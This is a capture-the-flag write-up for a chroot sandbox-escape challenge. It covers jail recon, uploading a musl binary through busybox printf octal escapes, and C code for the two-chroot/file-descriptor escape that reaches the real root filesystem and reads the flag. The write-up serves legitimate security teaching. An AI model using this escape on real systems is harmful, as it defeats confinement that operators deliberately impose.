# chroot-silver

**Event:** Kaspersky CTF 2026 (kit.sasc.tf / SAS CTF)
**Category:** misc / sandbox escape
**Points:** 64 (89-91 at time of writing)
**Flag:** `kaspersky{a9f61e72-504f-4d36-8094-be8147e05f42}` (per-instance)

---

## Challenge

```
- Are you selling?
- No, only showing.
- Beautiful.

openssl s_client \
  -connect .tcp.kit.sasc.tf:443 \
  -servername .tcp.kit.sasc.tf \
  -quiet

tcp://<hash>.tcp.kit.sasc.tf:443
```

Connecting drops you into a bare shell - a `chroot` jail. The objective is to
break out of the chroot and read the flag, which lives on the *real* filesystem
outside the jail.

## Recon

The jail contains only:

- `/bin/sh`, busybox `ash` (env shows `BB_ASH_VERSION='1.37.0'`)
- `/lib/ld-musl-x86_64.so.1` and `/lib/libc.musl-x86_64.so.1`, **musl**, not glibc

No `ls`, `cat`, `id`, `mkdir`, `chroot`, `base64`, `curl`, `wget`, `xxd`,
`head`, `grep`, `find`. No `/proc`, `/dev`, `/tmp`, `/etc`, `/home`, `/root`,
`/usr`. `PATH=/bin:/sbin:/usr/bin:/usr/sbin` but those dirs are empty except
`/bin/sh`.

Useful facts gathered with shell builtins:

```
$ echo /*                -> /bin /lib
$ set                    -> BB_ASH_VERSION=1.37.0, SOCAT_PID=545, SOCAT_PPID=1
$ echo /lib/*            -> /lib/ld-musl-x86_64.so.1 /lib/libc.musl-x86_64.so.1
```

`SOCAT_PPID=1` is the key hint: the shell is spawned by **socat**, and socat is a
direct child of PID 1 - socat runs **outside** the chroot, holding a reference to
the real filesystem. The `/` and `/bin` directories are writable, which lets us
write an escape binary into the jail.

## Connection

The provided `openssl s_client` snippet does not work well with piped stdin
(silent drops, HTTP 400 from the TLS frontend, resets). A Python `socket + ssl`
client with `server_hostname = <instance-hostname>` is reliable. See the skill
reference for the full client; the essentials:

```python
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(socket.socket(), server_hostname=host)
s.connect((host, 443))
```

## Building the escape binary (musl PIE)

The jail uses musl, so the binary must be musl-linked. The local box had no
`musl-gcc`, so I compiled inside an alpine container (plain `gcc` in alpine
already targets musl):

```bash
docker run --rm -v "$PWD":/work alpine:latest sh -c \
  'apk add --no-cache gcc musl-dev; gcc -Os -s -o /work/escape-pie /work/escape.c'
```

Two constraints force a specific binary shape:

1. **No exec bit.** Files created by shell redirect have no `+x`, and there is no
   `chmod`. Direct execution → `Permission denied`. Solution: run via the
   existing loader `/lib/ld-musl-x86_64.so.1 <binary>`, which does not require
   the exec bit.
2. **musl loader accepts only PIE.** The loader rejects ET_EXEC (`-static` or
   `-no-pie`) with `Not a valid dynamic program`. So build a plain dynamic PIE
   (`gcc -Os -s`, default on alpine) and let it link against the jail's own
   `/lib/libc.musl-x86_64.so.1`.

## Upload via `printf %b` (and the bug that cost 20 minutes)

No network tools, so upload the binary with the `printf` builtin, encoding bytes
as octal escapes. The **first attempt silently corrupted the binary**, producing
`unsupported relocation type 64` and segfaults that looked like a loader
mismatch but were actually broken bytes.

Root cause: **busybox `printf %b` parses octal escapes greedily (variable
length).** A NUL encoded as `\000` followed by a literal octal digit (`0` to `7`) merges:
`\0000` → `0x00`, `\0001` → `0x01`. Every byte value where a `\0xx` escape is
followed by an octal digit lost/shifted a byte - ~0.6% of a 14 KB binary.
(Also: `%` is *literal* under `%b`, so the old habit of escaping `%` as `%%`
would emit two bytes.)

**Fix - encode *every* byte as a 3-digit octal escape**, so each byte is
backslash-delimited and the greedy parser can't bleed forward:

```python
def encode_bytes(data: bytes) -> str:
    return "".join(f"\\{b:03o}" for b in data)
```

Verified byte-for-byte round-trip against a 0..255 sweep in an alpine container
(`cmp` clean) before touching a real binary.

## The escape (two-chroot / fd method)

```c
mkdir("/x", 0755);
int fd = open("/", O_RDONLY | O_DIRECTORY);  // fd to jail root BEFORE chroot
chroot("/x");                                 // confine to a subdir
fchdir(fd);                                   // cwd = OLD root via saved fd
close(fd);
for (int i = 0; i < 1024; i++) chdir("..");   // walk up to the real root
chroot(".");                                  // re-chroot to the real root
chdir("/");
```

Because we captured an fd to the jail root *before* chrooting, and
`fchdir(fd)` restores a cwd outside the new chroot, walking `..` climbs out of
the jail entirely. The final `chroot(".")` re-roots us onto the real filesystem.

## Flag

Rather than guessing `/flag`, the escape binary recurses the real root
(skipping `/proc`, `/sys`, `/dev`, `/usr`, `/lib*`, `/bin`, `/sbin`) and prints
any file containing `kaspersky{`:

```
[proc/1/cmdline] socat
[hostname] localhost

[HIT] /root/flag.txt (48 bytes):
kaspersky{a9f61e72-504f-4d36-8094-be8147e05f42}
```

`/proc/1/cmdline` = `socat` confirms the frontend that was outside the jail.

## Takeaways

- `SOCAT_PPID=1` (or any `*_PPID=1` env) → the jail's parent lives outside it.
- musl jails: build PIE musl binaries, run via `/lib/ld-musl-x86_64.so.1`.
- `printf %b` octal escapes are greedy in busybox - all-octal 3-digit encoding
  or you silently corrupt the upload.
- The flag is per-instance; re-leak on every fresh spawn, and search by content
  instead of guessing paths.
